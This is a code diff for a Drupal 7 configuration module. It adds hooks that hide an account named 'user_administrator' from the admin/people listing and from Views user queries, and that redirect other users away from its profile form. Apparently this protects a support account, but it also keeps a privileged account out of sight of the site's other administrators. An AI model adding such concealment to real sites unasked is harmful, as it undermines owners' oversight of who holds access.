@@ -149,6 +149,20 @@ function cce_basic_config_form_alter(&$form, &$form_state, $form_id) {
 }
 
 /**
+ * Implements hook_form_FORM_ID_alter().
+ *
+ * Restrict access to user_administrator profile form.
+ */
+function cce_basic_config_form_user_profile_form_alter(&$form, &$form_state, $form_id) {
+  global $user;
+  $account = user_load_by_name('user_administrator');
+
+  if (!empty($account) && $account->uid == $form['#user']->uid && $user->uid != 1) {
+    drupal_goto('admin/people', [], 307);
+  }
+}
+
+/**
  * Implements hook_field_info_alter().
  */
 function cce_basic_config_field_info_alter(&$info) {
@@ -473,5 +487,46 @@ function cce_basic_config_js_alter(&$javascript) {
     'defer' => TRUE,
     'weight' => 5,
   ));
+}
 
+/**
+ * Implements hook_query_alter().
+ *
+ * Restrict access to user_administrator.
+ */
+function cce_basic_config_query_alter(QueryAlterableInterface $query) {
+  global $user;
+
+  if ($user->uid == 1 || !function_exists('current_path')) {
+    return;
+  }
+
+  $path = current_path();
+
+  if ($path !== 'admin/people') {
+    return;
+  }
+
+  $tables = &$query->getTables();
+
+  if (isset($tables['u']) && isset($tables['u']['table']) && $tables['u']['table'] == 'users') {
+    $account = user_load_by_name('user_administrator');
+
+    if (!empty($account)) {
+      $query->condition('u.uid', $account->uid, '<>');
+    }
+  }
+}
+
+/**
+ * Implements hook_views_query_alter().
+ */
+function cce_basic_config_views_query_alter(&$view, &$query) {
+  if ($view->base_table == 'users') {
+    $account = user_load_by_name('user_administrator');
+
+    if (!empty($account)) {
+      $query->add_where('users', 'users.uid', $account->uid, '<>');
+    }
+  }
 }
